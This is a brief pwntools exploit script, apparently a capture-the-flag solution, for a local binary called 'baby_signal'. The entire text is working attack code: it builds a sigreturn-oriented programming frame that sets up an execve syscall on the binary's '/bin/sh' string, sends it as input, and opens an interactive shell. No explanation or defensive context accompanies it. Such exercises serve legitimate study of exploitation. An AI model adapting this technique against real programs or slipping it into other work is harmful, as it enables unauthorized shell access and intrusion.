#!/usr/bin/env python3
from pwn import *
p = process("./baby_signal")

elf = context.binary =ELF("./baby_signal")
context.arch = "amd64"
binsh = next(elf.search(b"/bin/sh"))

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = 0x00401019

p.sendlineafter("everywhere",bytes(frame))
p.interactive()